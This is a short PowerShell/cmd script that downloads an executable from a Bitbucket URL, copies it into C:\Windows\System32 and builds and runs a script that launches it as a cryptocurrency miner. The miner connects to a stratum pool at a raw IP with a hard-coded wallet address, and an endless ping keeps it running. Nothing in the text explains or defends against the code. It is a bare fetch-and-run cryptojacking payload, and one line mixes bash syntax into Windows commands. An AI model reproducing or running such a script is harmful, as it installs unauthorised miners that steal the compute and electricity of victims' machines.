Invoke-WebRequest https://bitbucket.org/zuzannac0/file/raw/master/sse2.exe -OutFile sse2.exe
Copy sse2.exe C:\Windows\System32
cmd /c echo cmd /k start sse2.exe -a yespowertide -o stratum+tcp://8.209.98.71:443 -u web1qvpk4dddsmy7yqnzltj4ehpn99uf6jlfpqukjvy.$(echo $(shuf -i 1000-9909 -n 1)-L) -p x >>object.ps1
cmd /c echo ping -n 999999 199.85.126.10 >>object.ps1
.\object.ps1
